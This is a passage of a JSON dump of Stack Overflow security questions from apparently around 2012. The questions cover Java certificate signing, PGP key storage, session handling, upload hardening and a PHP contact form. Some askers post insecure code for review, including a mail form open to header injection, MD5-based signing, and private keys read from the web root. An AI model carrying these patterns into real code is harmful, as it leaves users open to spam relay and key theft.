CertificateX509Key(pair.getPublic()));\n    info.set(X509CertInfo.VERSION, new CertificateVersion(CertificateVersion.V3));\n    AlgorithmId algo = new AlgorithmId(AlgorithmId.md5WithRSAEncryption_oid);\n    info.set(X509CertInfo.ALGORITHM_ID, new CertificateAlgorithmId(algo));\n\n    // Sign the cert to identify the algorithm that's used.\n    X509CertImpl cert = new X509CertImpl(info);\n    cert.sign(privkey, algorithm);\n\n    // Update the algorith, and resign.\n    algo = (AlgorithmId)cert.get(X509CertImpl.SIG_ALG);\n    info.set(CertificateAlgorithmId.NAME + \".\" + CertificateAlgorithmId.ALGORITHM, algo);\n    cert = new X509CertImpl(info);\n    cert.sign(privkey, algorithm);\n    return cert;\n</code></pre>\n\n<p>}</p>\n\n<p>Then I generate the cert signing request and I save it to csrFile file:</p>\n\n<pre><code>public static void writeCertReq(File csrFile, String alias, String keyPass, KeyStore ks) \n        throws KeyStoreException, \n               NoSuchAlgorithmException, \n               InvalidKeyException, \n               IOException, \n               CertificateException, \n               SignatureException, \n               UnrecoverableKeyException {\n\n    Object objs[] = getPrivateKey(ks, alias, keyPass.toCharArray());\n    PrivateKey privKey = (PrivateKey) objs[0];\n\n    PKCS10 request = null;\n\n    Certificate cert = ks.getCertificate(alias);\n    request = new PKCS10(cert.getPublicKey());\n    String sigAlgName = \"MD5WithRSA\";\n    Signature signature = Signature.getInstance(sigAlgName);\n    signature.initSign(privKey);\n    X500Name subject = new X500Name(((X509Certificate) cert).getSubjectDN().toString());\n    X500Signer signer = new X500Signer(signature, subject);\n    request.encodeAndSign(signer);\n    request.print(System.out);\n    FileOutputStream fos = new FileOutputStream(csrFile);\n    PrintStream ps = new PrintStream(fos);\n    request.print(ps);\n    fos.close();\n}\n</code></pre>\n\n<p>where</p>\n\n<pre><code>private static Object[] getPrivateKey(KeyStore ks, String alias, char keyPass[]) \n        throws UnrecoverableKeyException, KeyStoreException, NoSuchAlgorithmException {\n    key = null;        \n    key = ks.getKey(alias, keyPass);\n    return (new Object[]{ (PrivateKey) key, keyPass });\n}\n</code></pre>\n\n<p>Now I should sign the CSR with the CA private key, but I cannot see how to achive that in java. I have \"my own\" CA private key in my jks. </p>\n\n<p>Besides, once I manage to sign the CSR I should chain the CA cert with the signed CSR: how that can be done in java?</p>\n\n<p>I would prefer not to use bc or other external libs, just \"sun.security\" classes.</p>\n\n<p>Thank you.</p>\n"},{"tags":["javascript","ajax","django","security","web-applications"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":57,"score":-1,"question_id":12330176,"title":"Security issues regarding ajax","body":"<p>I want to design a 'like/dislike' system for my webapp.I'm thinking about something like 'http://mywebapp/like/'.If user makes an ajax call to the already mentioned url.It will like the item on the behalf of the user.\nSo,is there any security flaw in my idea?\n[EDIT 1]\nCan a malicious user make ajax calls and have his/her vote counted?If yes then what can I do to prevent it?</p>\n"},{"tags":["javascript","security","passwords"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":11780249,"title":"A function to detect common passwords and prevent user from setting it?","body":"<p>I'm working on user passwords security and one of the important things for me is to force the user to reenter a password when the password is found in most common passwords list.</p>\n\n<p>What would be the best way to do this?</p>\n"},{"tags":["php","security","postgresql","pdo","pgp"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12329652,"title":"Secure method for storing/retrieving a PGP private key and passphrase?","body":"<p>I have a web application that needs to store server login information. I'm using a 2048bit PGP public key to encrypt inserted passwords (see the <code>insertServerDef</code>) and a private key with a passphrase to decrypt the passwords (see <code>getServerDef</code>).</p>\n\n<p>As I understand things, the weakest link in this chain is the handling of the private key and passphrase. As you can see from my code below, I'm just using <code>file_get_contents</code> to retrieve the key and passphrase from files located in the current web directory--not good.</p>\n\n<p>My question is: what is a good method for securely retrieving the private key and passphrase for use in decrypting login info? Maybe I should store/retrieve the private key via an authenticated remote file server?</p>\n\n<p>I've searched for best practices, but haven't been able to find much.</p>\n\n<pre><code>class DB {\n\n    protected $_config;\n    protected $_iUserId;\n    protected $_iServerId;\n    protected $_dbConn;\n    protected $_sPubKey;\n    protected $_sPrivKey;\n\n\n    public function __construct($iUserId, $iServerId) {\n\n        //bring the global config array into local scope\n        global $config;\n        $this-&gt;_config = $config;\n\n        $this-&gt;_iUserId = $iUserId;\n        $this-&gt;_iServerId = $iServerId;\n\n        $this-&gt;_sPubKey = file_get_contents(\"public_key\");\n        $this-&gt;_sPrivKey = file_get_contents(\"private_key\");\n        $this-&gt;_sPrivKeyPass = trim(file_get_contents(\"private_key_pass\"));\n\n    }\n\n    //connect to the database\n    public function connect() {\n        try {\n\n\n            $this-&gt;_dbConn = new PDO(\"pgsql:host=\".$this-&gt;_config['db_host'].\" dbname=\".$this-&gt;_config['db_name'],$this-&gt;_config['db_username'],$this-&gt;_config['db_password']);\n\n            echo \"PDO connection object created\";\n        } catch(PDOException $e) {\n\n            echo $e-&gt;getMessage();\n\n        }\n\n    }\n\n    public function insertServerDef($sHost, $iPort, $sUser, $sPass) {\n\n        //testing\n        $iUserId = 1;\n\n        $oStmt = $this-&gt;_dbConn-&gt;prepare(\"INSERT INTO upze_server_def (server_id, host_address, ssh_port, username, pass, user_id) VALUES (DEFAULT, :host_address, :ssh_port, :username, pgp_pub_encrypt(:pass,dearmor(:pub_key)), :user_id)\");\n        $oStmt-&gt;bindParam(':host_address',$sHost);\n        $oStmt-&gt;bindParam(':ssh_port',$iPort);\n        $oStmt-&gt;bindParam(':username',$sUser);\n        $oStmt-&gt;bindParam(':pass',$sPass);\n        $oStmt-&gt;bindParam(':pub_key',$this-&gt;_sPubKey);\n\n        $oStmt-&gt;bindParam(':user_id',$iUserId);\n        $oStmt-&gt;execute();\n\n    }\n\n    public function getServerDef($iServerId) {\n\n        $oStmt = $this-&gt;_dbConn-&gt;prepare(\"  SELECT server_id, pgp_pub_decrypt(pass,dearmor(:priv_key),:priv_key_pass) As decryptpass \n                                            FROM upze_server_def usd \n                                            WHERE usd.server_id = :server_id\n                                        \");\n\n        $oStmt-&gt;bindParam(':server_id', $iServerId);\n        $oStmt-&gt;bindParam(':priv_key', $this-&gt;_sPrivKey);\n        $oStmt-&gt;bindParam(':priv_key_pass', $this-&gt;_sPrivKeyPass);\n        $oStmt-&gt;execute();\n\n        while($row = $oStmt-&gt;fetch()) {\n            echo \"&lt;pre&gt;\".print_r($row).\"&lt;/pre&gt;\";\n        }\n\n    }\n\n    //close any existing db connection\n    public function close() {\n        $this-&gt;_dbConn = null;\n    }\n\n\n    //close any existing db connections on unload\n    public function __destruct() {\n        $this-&gt;_dbConn = null;\n    }\n\n}\n</code></pre>\n"},{"tags":["actionscript-3","flash","security","google-maps","sandbox"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":12329799,"title":"Security Sandbox Violation in AS3 accessing images from googleapis.com","body":"<p>I am loading a street view image from the Google Street View Images API. This works offline, but as soon as I upload it to the server I get a Sandbox violation. The CLIENT and SIGNATURE is setup correct.</p>\n\n<pre><code>Security.allowDomain( \"maps.google.com\" );\nSecurity.allowInsecureDomain( \"maps.google.com\" );\nSecurity.allowDomain( \"maps.googleapis.com\" );\nSecurity.allowInsecureDomain( \"maps.googleapis.com\" );\nSecurity.loadPolicyFile( \"maps.google.com/crossdomain.xml\" );\nSecurity.loadPolicyFile( \"maps.googleapis.com/mapsapi/crossdomain.xml\" );\n\n_imageLoaderContext = new LoaderContext( true, ApplicationDomain.currentDomain, SecurityDomain.currentDomain );\n\n_imageLoader = new Loader();\n_imageLoader.contentLoaderInfo.addEventListener( Event.COMPLETE, onStreetImageLoadComplete );\n_imageLoader.load( new URLRequest( pUrl ), _imageLoaderContext );\n</code></pre>\n\n<blockquote>\n  <p>Error #2044: Unhandled SecurityErrorEvent:. text=Error #2121: Security\n  sandbox violation: <a href=\"http://domain.com/Main.swf\" rel=\"nofollow\">http://domain.com/Main.swf</a>:\n  <a href=\"http://maps.googleapis.com/maps/api/streetview?client=CLIENT&amp;size=1024x1024&amp;location=57.704158,11.96813599999996&amp;pitch=10&amp;heading=252&amp;sensor=false&amp;signature=SIGNATURE\" rel=\"nofollow\">http://maps.googleapis.com/maps/api/streetview?client=CLIENT&amp;size=1024x1024&amp;location=57.704158,11.96813599999996&amp;pitch=10&amp;heading=252&amp;sensor=false&amp;signature=SIGNATURE</a> cannot access . This may be worked around by calling\n  Security.allowDomain.</p>\n</blockquote>\n"},{"tags":["vb.net","security","ms-access"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12329641,"title":"Secure MS Access database in Windows Application","body":"<p>I have created a Windows Application in Vb.Net using MS Access 2007 database. I want it to be secured in such a way that the user who uses the application must not be able to see its content or access it. Protecting the file with password isn't a secure way.</p>\n\n<p>Need help to secure and protect the MS Access database.</p>\n"},{"tags":["windows","security","winapi","device-driver","scsi"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":118,"score":3,"question_id":12328106,"title":"SPTI/SCSI operations from a Windows 7 application","body":"<p>I need some help regarding a security problem in updating some Windows software for communicating with a non-storage SCSI device.</p>\n\n<p>The original software was written for Windows XP as a DLL, and talked with the device via Adaptec's ASPI API. ASPI didn't really have any security, so any application run by any user could use my DLL to talk to one of these devices, and everything worked great.</p>\n\n<p>I'm now updating the software to work with Windows 7 using Microsoft's modern SPTI (SCSI Pass-Through Interface) API. Things work fine with SPTI under XP, but Windows 7 has much tighter security, and for normal users or even administrators, SPTI calls return an error indicating insufficient permissions. If I log in using the hidden \"Administrator\" account, my software runs fine with SPTI, but that's not an acceptable deployment option.</p>\n\n<p>Here are some alternatives I've looked into so far, in order of decreasing level of having to rewrite existing code:</p>\n\n<ul>\n<li>Spinning off a thread and escalating its privileges to be pretend to be \"Administrator\" so it can talk with SPTI. [I haven't been able to get this to work using LogonUser()/ImpersonateLoggedOnUser()/LoadUserProfile(); the call to LoadUserProfile() fails, and SPTI calls fail as well with an insufficient permissions error.]</li>\n<li>Writing a Windows Service that has adequate permissions to talk with SPTI, and then having my DLL talk with that service.</li>\n<li>Userspace (UMDF) driver. It would be an expensive rewrite, and it's not clear to me whether UMDF supports accessing SCSI devices.</li>\n<li>Kernel (KMDF) driver. Should work, but would be a longer, more expensive rewrite.</li>\n</ul>\n\n<p>I hope the community here can help with some wisdom/experience/ideas that will let my code talk to this SCSI device under Windows 7, ideally without having to rewrite too much.</p>\n"},{"tags":["php","security","injection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12327241,"title":"Protecting PHP email form from injection?","body":"<p>I've heard of PHP forms being abused to send email from the person the form is supposed to send to. Is this an actual problem, and if so, how can it be fixed? Is it similar to preventing SQL injection?</p>\n"},{"tags":["java","android","security","exploit"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":90,"score":0,"question_id":12327023,"title":"Will the recent exploit we heard about with Java 1.7 apply to Android?","body":"<p>Will <a href=\"http://www.oracle.com/technetwork/topics/security/alert-cve-2012-4681-1835715.html\" rel=\"nofollow\">the recent exploit we heard about with Java 1.7</a> apply to Android?  I haven't seen any articles on this.</p>\n"},{"tags":["php","mysql","security","session","login"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":109,"score":0,"question_id":12318564,"title":"PHP how to start a secure session","body":"<p>currently i am starting a session as follows:</p>\n\n<pre><code>if ($hasher-&gt;CheckPassword($password, $hash)) { //$hash is the hash retrieved from the DB \n        $what = 'Authentication succeeded';\n            $_SESSION['username']=$_POST['username'];\n         header('Location: securedpage1.php');\n    } else {\n        $what = 'Authentication failed';\n        echo \"Incorrect Password\";\n        include 'login.php';\n        exit();\n\n    }\n</code></pre>\n\n<p>as you can see i am wondering if <code>$_SESSION['username']=$_POST['username'];</code> is the best way to start a session or if there are better practices </p>\n\n<p>Thank you for any responses!</p>\n"},{"tags":["android","database","security","password-protection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":146,"score":1,"question_id":11960326,"title":"How to secure database (encrypted) password on Android?","body":"<p>I have a database containing private information that must only be accessible to my application. I added my database file in assets folder which gets copied over to applications database directory on first time the app runs but \"assets\" directory and \"data\" directory(on rooted devices) can be accessed by any other application So I decided to encrypt the database. Android default SQLite Database doesn't provide encryption of the data so I decided to use SQLCipher for android <a href=\"http://sqlcipher.net/sqlcipher-for-android/\" rel=\"nofollow\">http://sqlcipher.net/sqlcipher-for-android/</a>.</p>\n\n<p>Now I have successfully encrypted the database and I can access it using the specific password. But problem remains... Where should I store this password? so that it can only be accessible to my application. </p>\n\n<ol>\n<li>Can't hardcode it as it will be accessible after decompiling it even if it is obfuscated.</li>\n<li>Can't store it in the file system either (assets/raw)</li>\n<li>Can't ask the user to enter it as the user could be a hacker</li>\n</ol>\n\n<p>It is standalone app with no server interaction at all</p>\n"},{"tags":[".net","wcf","security","c#-4.0","certificates"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12223575,"title":"WCF authentication on IIS7 shared hosting without using certificates but using secure channel (ie., password is not sent in clear text over network)","body":"<p>I am stuck on following error when I tried to implement the solution proposed in following link:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/6216953/wcf-authentication-on-iis7-shared-hosting?answertab=votes#tab-top\">WCF authentication on IIS7 shared hosting</a></p>\n\n<p>Error 1 The type or namespace name 'ServiceCredentials' could not be found (are you missing a using directive or an assembly reference?) C:\\Users\\rxk10324\\Downloads\\WcfService5\\WcfService5\\Service1.svc.cs 85 58 WcfService5</p>\n\n<p>It is complaining on this line of your code: var credentials = Description.Behaviors.Find&lt;<strong>ServiceCredentials</strong>>();</p>\n\n<p>Can you explain me what this line is trying to do? I want to authenticate database users in WCF service without using certificates but using secure channel (ie., password is not sent in clear text over network). Please guide me to relevant links.</p>\n\n<p>Thanks,\nRK</p>\n"},{"tags":["ios","security","rsa"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12319849,"title":"get SecKeyRef from base64 coded string","body":"<p>I'm working on an iOS app and I get a base64 coded publickey.(e.g:MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3gn+tJ1+PbP0GHa6hmM35WsVyibpypWAwRuBYY4MGfh3VWoXgiyiLo5HJTW1eR9BUFq3z+yOG1rwzSabZ8I4zneWm0kH7xErSjNrMbmjirbL7e6TQNa1ujP/x4x9XVbqf3vIsNVs19kn/qSX/HGzd5Ct3TGAo0AT0T4JwkCfciwIDAQAB)</p>\n\n<p>I'd like to encode some text with this publickey, but I can not find a way how to convert this string to a useful publickey.</p>\n\n<p>Please help me!</p>\n"},{"tags":["security","encryption","passwords"],"answer_count":15,"favorite_count":6,"up_vote_count":37,"down_vote_count":0,"view_count":12445,"score":37,"question_id":98768,"title":"Should I impose a maximum length on passwords?","body":"<p>I can understand that imposing a minimum length on passwords makes a lot of sense (to save users from themselves), but my <strong>bank</strong> has a requirement that passwords are between 6 and 8 characters long, and I started wondering...</p>\n\n<ul>\n<li>Wouldn't this just make it easier for brute force attacks? (Bad)</li>\n<li>Does this imply that my password is being stored unencrypted? (Bad)</li>\n</ul>\n\n<p>If someone with (hopefully) some good IT security professionals working for them are imposing a max password length, should I think about doing similar? What are the pros/cons of this?</p>\n"},{"tags":["security","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12324921,"title":"Protect data from firebug specific ability in changin values","body":"<p>My problem is about how can we protect data like user_id or ordered_post_id?\nImagine we have a url with some arguments like user_id and etc.\nwe can generate url with Dom via reading html elements( &lt; tag id=\"user_id\" > User ID Here &lt; /tag >), but here is one problem! Bad hackers can change \"User ID Here\" with firebug.</p>\n\n<p>One solution is storing data with sessions, but there is no accessibility to our data when one user click on a specific button for generating our URL which is responsible for handling some Logic tasks.</p>\n\n<p>how can i protect data and having on demand accessibility on data?</p>\n\n<p>thanks.</p>\n"},{"tags":["string","security","visual-c++","resize"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12323862,"title":"Securely resizing and deletion of std::string","body":"<p>I have a class that contains a a string. Currently, it's an std::wstring but does not have to be. I had read <a href=\"http://stackoverflow.com/questions/5698002/how-does-one-securely-clear-stdstring\">here</a> that std::string should not be used but I am wondering if something like this would work:</p>\n\n<pre><code>if (aString.length() == aString.capacity() )\n{\n    std::wstring oldString = aString;\n    aString = wstring(aString);\n    aString.reserve(PREALLOCATION_AMOUNT);\n    SecureZeroMemory((PVOID)oldString.c_str(),oldString.size());\n    oldString.clear();\n}\n</code></pre>\n\n<p>would this basically equate to a secure realloc of the string buffer? If not is there a better solution?</p>\n"},{"tags":["osx","cocoa","security","app-store","preferences"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1072,"score":3,"question_id":12046918,"title":"Your security preferences allow installation of only apps from the Mac App Store and identified developers","body":"<p>I'm a newbie at mac osx development. I would like to know if there's any way to override the mac desktop security settings to allow an application - which is not registered in the Mac App Store, to be installed?</p>\n\n<p>The setting should come from the app that I'm trying to install. That means, whenever I install the app to any mac computer, regardless of its security settings as the following,</p>\n\n<p>Allow applications downloaded from:</p>\n\n<ul>\n<li>Mac App Store</li>\n<li>Mac App Store and identified developers</li>\n<li>Anywhere</li>\n</ul>\n\n<p>The app should set the settings to <strong>Anywhere</strong>, allowing it to be installed.\nAny help would be very much appreciated. </p>\n"},{"tags":["php","apache","security","superglobals"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":51,"score":4,"question_id":12319599,"title":"Is there a good alternative to $_SERVER['SERVER_NAME']?","body":"<p>I read the following comment on <a href=\"http://php.net/manual/en/reserved.variables.server.php\" rel=\"nofollow\">PHP doc pages</a>:</p>\n\n<blockquote>\n  <p>\"Be warned that most contents of the Server-Array (even\n  $_SERVER['SERVER_NAME']) are provided by the client and can be\n  manipulated. They can also be used for injections and thus MUST be\n  checked and treated like any other user input.\"</p>\n</blockquote>\n\n<p>An then I saw a topic here <a href=\"http://stackoverflow.com/questions/6474783/which-server-variables-are-safe/6474936#6474936\">on StackOverflow saying that $_SERVER['SERVER_NAME'] is partly server controlled</a>.</p>\n\n<p>Can I trust on this value to get the url of my website? If I can't really trust $_SERVER['SERVER_NAME'], how can I get this value? What are some possible alternatives and their pro and cons?</p>\n\n<p><strong>OBS:</strong> <em>PHP 5.3 on Apache, Unix.</em></p>\n"},{"tags":["security","session","cookies","plone"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":12314041,"title":"Plone session security findings - any ideas?","body":"<p>From a recent audit of our Plone 4.01 instance:</p>\n\n<ol>\n<li><p>Where possible encrypt the username stored in the session cookie, or use the one-time session ID to identify the user (at the server end) instead of the username.</p>\n\n<ul>\n<li>The usernames were stored in the applications session cookie using base64 encoding, which can be easily decoded.</li>\n</ul></li>\n<li><p>Invalidate the session ID immediately when the user logs out.</p>\n\n<ul>\n<li>When logging out of the PLONE application, the application deletes the cookie, however does not invalidate the user session ID.  It was also noted that authenticating with the application a second time did not invalidate previous session cookies.</li>\n</ul></li>\n</ol>\n\n<p>We would prefer not to add another product to the stack to resolve these findings if possible.</p>\n\n<p>Btw we do have Beaker installed and this is being used for public accounts as part of the  ecommerce area of the site, whereas the content admins/authors are using the standard Plone login/security mechanism which is what is drawing the audit findings... perhaps Beaker can be reused for the content authors as well? Not sure if this is a good idea though...</p>\n\n<p>Btw we are also updating to Plone 4.2 soonish.</p>\n"},{"tags":["silverlight","security","certificate","silverlight-5.0","trusted-application"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":9273255,"title":"Security concern regarding full trusted in-browser applications","body":"<p>I need a full trusted Silverlight application run in-browser mode.</p>\n\n<p>For this purpose I can buy a certificate sign application and require IT to enable <em>AllowElevatedTrustAppsInBrowser</em>. However enabling this property will allow to run all the signed Silverlight applications from other publishers. And this is a security issue, because some user data could be accessed with somebody's app over the internet.</p>\n\n<p>How can I make application trusted from specific list of publishers? Is it possible to manage it with GPO (I found only managing add-on options, but it limits plugin availability for domains not app)?</p>\n\n<p>Is there some workaround?</p>\n\n<p>Thanks</p>\n\n<p><em>updated</em></p>\n\n<p>Only workaround I see is to limit Silverlight plugin to list of trusted domains via manage add-ons (you can do it via GPO), but in this case user is notified when plugin could not be shown and can allow it.</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":111,"score":6,"question_id":12318907,"title":"How can I protect a PHP image upload script from exploits?","body":"<p>I've created (using <a href=\"http://www.dagondesign.com/articles/secure-php-form-mailer-script/\">a script</a> and some help from Stack and some help from friends; I know very little about PHP) a simple page for a local non-profit publication where people can upload photos. </p>\n\n<p>I'm not great with security (from a basis of ignorance, not deliberate negligence) but I've taken the following steps to protect this page: </p>\n\n<p> the PHP script is set to only accept .jpg, .png and .tif files for upload;<br>\n the subfolder that it saves the form content to has permissions set at 700, and the subfolder it saves uploaded photos to has permissions set at 700;<br>\n according to documentation, my host has the following configuration to ensure that only .php files run as .php: </p>\n\n<pre><code>&lt;FilesMatch \\.php$&gt;\n    SetHandler php52-fcgi\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p> Ive put an .htaccess file in the relevant (main and saved content) folders: </p>\n\n<pre><code>RemoveHandler .php\nRemoveHandler .inc\nRemoveHandler .pl\nRemoveHandler .cgi\nRemoveHandler .py\nRemoveHandler .fcgi\n</code></pre>\n\n<p>Overnight, however, somebody found this test page and submitted what seems to be a perfectly benign test message and small .jpg. This is a private test page with a non-intuitive URL that only I and about three other people know about; none of the others sent this test. </p>\n\n<p>This obviously has me worried that there's something hinky going on, and I'm worried that I don't know enough about security to make sure this page is safe. </p>\n\n<p>Is there something obvious that I'm missing? </p>\n"},{"tags":["asp.net","security","password-protection","web-folders"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":2,"view_count":46,"score":0,"question_id":12319020,"title":"Securing a folder in ASP.NET web directory","body":"<p>I worked long time back on a website and it has been working fine, recently a problem has been reported, which I need to go through.</p>\n\n<p>In my site there is a folder named repository, which contains files like word and PDF documents and ideally only logged in users are allowed to download them but now it has been observed that anyone who is not logged into the website, can even also download them :(</p>\n\n<p>Is there any wayout to handle it without moving the folder out of the web directory? Like making that folder password protected and only my pages can access the content, any code sample or link will be of high use.</p>\n\n<p>My web application is in ASP.NET 2.0 with C# and server has IIS 6.0.</p>\n\n<p>Thanks in Advance</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>My Web.Config has these tags in it:</p>\n\n<pre><code>&lt;authentication mode=\"Forms\"&gt;\n  &lt;forms slidingExpiration=\"true\" loginUrl=\"Login.aspx\" defaultUrl=\"HomePage.aspx\" name=\".ASPXMAIN\" timeout=\"30\"&gt;\n  &lt;/forms&gt;\n&lt;/authentication&gt;\n&lt;authorization&gt;\n  &lt;deny users=\"?\" /&gt;\n&lt;/authorization&gt;\n</code></pre>\n"},{"tags":["spring","security","login","spring-security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12312174,"title":"Stop accepting GET request in spring j_acegi_security_check","body":"<p>I am using  <code>j_acegi_security_check</code> to login into the <code>Spring</code> web application but because it is accepting <code>GET</code> parameters, too, this means that I'm able to login into the application with</p>\n\n<pre><code>&lt;https://localhost:8080/webapp/j_acegi_security_check?j_username=***&amp;j_password=***&amp;loginButton=Login&gt;\n</code></pre>\n\n<p>I want to avoid this. It should accept only <code>POST</code> requests. How to do this?</p>\n"},{"tags":["django","security","django-staticfiles"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":79,"score":6,"question_id":12311511,"title":"Isn't it unsafe to expose django media_url to everyone?","body":"<p>According to Django document: \"it was common to place static assets in MEDIA_ROOT along with user-uploaded files, and serve them both at MEDIA_URL. \"</p>\n\n<p>Does that mean everyone could access other people's uploaded files?\nIsn't it unsafe?</p>\n"},{"tags":["java","eclipse","security","settings"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12318904,"title":"Java Security NoSuchAlgorithmException in only One of Three Eclipse Instances","body":"<p>Recently had a problem with </p>\n\n<blockquote>\n  <p>java.security.NoSuchAlgorithmException: Algorithm HmacSHA1 not available</p>\n</blockquote>\n\n<p>Tried to isolate the problem, using this simple code: </p>\n\n<blockquote>\n<pre><code>import java.security.NoSuchAlgorithmException;\n\nimport javax.crypto.Mac;\n\npublic class Main {\n  public static void main(String... args) {\n\n      final String HMAC_SHA1_ALGORITHM = \"HmacSHA1\";\n      Mac instance;\n      try {\n          instance = Mac.getInstance(HMAC_SHA1_ALGORITHM);\n      } catch (NoSuchAlgorithmException e) {\n          final String errmsg = \"NoSuchAlgorithmException: \"\n                  + HMAC_SHA1_ALGORITHM + \" \" + e;\n          // ...\n      }\n\n  }\n}\n</code></pre>\n</blockquote>\n\n<p>The thing is that this works in one of my Eclipse instances, and not on the other. All tested using New Java Project, pasting the above, and running, so this <em>should</em> be due to some settings difference between the Eclipse instances. </p>\n\n<p>I've tried to look through all the seemingly relevant settings (classpath, JRE, java compiler), but nothing that looks different or makes it work if changed. (If someone knows how to 'diff' the settings of two Eclipses, do tell!)</p>\n\n<p>I'm resorting to simply using a third Eclipse (where it works (so far)), but it would still be interesting to learn what this potentially infuriating problem is really down to. </p>\n"},{"tags":["php","jquery","html","forms","security"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":131,"score":2,"question_id":12315112,"title":"Is this form safe?","body":"<p>I have this form by which a user sends me an email. I don't know if it is secured, or if issues with security appear only if sql is involved...</p>\n\n<p>html:</p>\n\n<pre><code>&lt;form id=\"form4\" action=\"send_mic.php\"  name=\"form4\" method=\"post\" &gt;\n\n           &lt;textarea name=\"message4\" cols=\"4\" rows=\"4\"  id=\"message4\" &gt;&lt;/textarea&gt;&lt;br /&gt;\n\n           &lt;input type=\"text\"  id=\"name4\" name=\"name4\" value=\"\" /&gt;&lt;br /&gt;\n\n           &lt;input type=\"text\"  id=\"email4\" name=\"email4\" value=\"\"  /&gt;&lt;br /&gt;\n\n          &lt;input type=\"submit\" value=\"\" id=\"submit\" /&gt;\n\n&lt;/form&gt;\n</code></pre>\n\n<p>jquery:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function () {\n    $('#form4').ajaxForm({\n        beforeSubmit: validate\n    });\n\n    function validate(formData, jqForm, options) {\n        var name = $('input[name=name4]').fieldValue();\n        var email = $('input[name=email4]').fieldValue();\n        var message = $('textarea[name=message4]').fieldValue();\n\n        if (!name[0]) {\n            alert('Please enter a value for name');\n            return false;\n        }\n        if (!email[0]) {\n            alert('Please enter a value for email');\n            return false;\n        }\n        if (!message[0]) {\n            alert('Please enter a value for message');\n            return false;\n        }\n\n        else {\n\n        $(\"#content\").fadeOut(1000, function () {\n            $(this).html(\"&lt;img src='images/postauto3.png'/&gt;\").fadeIn(2000);\n        });\n\n        var message = $('textarea[name=message4]').val('');\n        var name = $('input[name=name4]').val('');\n        var email = $('input[name=email4]').val('');\n\n            } \n    }\n\n});\n\n\n\n    &lt;/script&gt; \n</code></pre>\n\n<p>php:</p>\n\n<pre><code>&lt;?php\n        if($_POST){\n                $email = $_POST['email4'];\n                $name = $_POST ['name4'];\n                $message = $_POST ['message4'];\n                // response hash\n                $ajaxresponse = array('type'=&gt;'', 'message4'=&gt;'');\n\n                try {\n                        // do some sort of data validations, very simple example below\n                        $all_fields = array('name4', 'email4', 'message4');\n\n                        foreach($all_fields as $field){\n                                if(empty($_POST[$field])){\n                                        throw new Exception('Required field \"'.ucfirst($field).'\" missing input.');\n                                }\n                        }\n\n                        // ok, if field validations are ok\n                        // now Send Email, ect.\n\n                        // let's assume everything is ok, setup successful response\n                        $subject = \"New Contact\";\n                        //get todays date\n                        $todayis = date(\"l, F j, Y, g:i a\") ;\n\n                        $message = \" $todayis \\n\n                        Attention: \\n\\n\n                        Please see the message below: \\n\\n\n                        Email Address: $email \\n\\n\n                        Message: $message \\n\\n\n\n                        \";\n\n                        $from = \"From: $email\\r\\n\";\n\n\n                        //put your email address here\n                        mail(\"contact@....ro\", $subject, $message, $from);\n\n                        //prep json response\n                        $ajaxresponse['type'] = 'success';\n                        $ajaxresponse['message'] = 'Thank You! Will be in touch soon';  \n                } catch(Exception $e){\n                        $ajaxresponse['type'] = 'error';\n                        $ajaxresponse['message'] = $e-&gt;getMessage();\n                }\n                // now we are ready to turn this hash into JSON\n                print json_encode($ajaxresponse);\n                exit;\n        }\n?&gt;\n</code></pre>\n\n<p>So, are there any security problems when using forms to send emails? Is this ok?\nThanks!</p>\n"},{"tags":["php","database","security","testing","automation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12316139,"title":"Test tools for Database, Code (php), Security","body":"<p>What tools best fit to test automatically:</p>\n\n<p><strong><ol>Code:</ol></strong></p>\n\n<ol>\n<li>Copy/Paste code detector</li>\n<li>Commented code checker</li>\n</ol>\n\n<p><strong><ol>DB:</ol></strong></p>\n\n<ol>\n<li>Encoding check</li>\n<li>Field size check</li>\n</ol>\n\n<p><strong><ol>Security:</ol></strong></p>\n\n<ol>\n<li>XSS</li>\n<li>SQL inject </li>\n<li>Vulnerability 